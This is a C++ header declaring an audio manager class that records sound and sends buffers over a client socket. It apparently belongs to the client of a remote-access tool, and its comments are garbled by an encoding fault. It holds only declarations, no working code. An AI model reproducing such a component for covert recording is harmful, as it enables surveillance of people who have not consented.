// AudioManager.h: interface for the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_AUDIOMANAGER_H__F956E94C_3AA6_4515_A76D_F18CD598ED74__INCLUDED_)
#define AFX_AUDIOMANAGER_H__F956E94C_3AA6_4515_A76D_F18CD598ED74__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "..\..\..\common\audio.h"
class CAudioManager : public CManager  
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();
public:
	void OnReceive( LPBYTE lpBuffer, UINT nSize );
	int sendRecordBuffer();
	static DWORD WINAPI WorkThread(LPVOID lparam);
    static bool m_bIsWorking;           //�ж��߳��Ƿ��ڹ���
	
private:
	
	CAudio	*m_lpAudio;             //��Ƶ¼�Ƶ���
	HANDLE	m_hWorkThread;          //¼���߳�
protected:
	bool Initialize();
};

#endif // !defined(AFX_AUDIOMANAGER_H__F956E94C_3AA6_4515_A76D_F18CD598ED74__INCLUDED_)
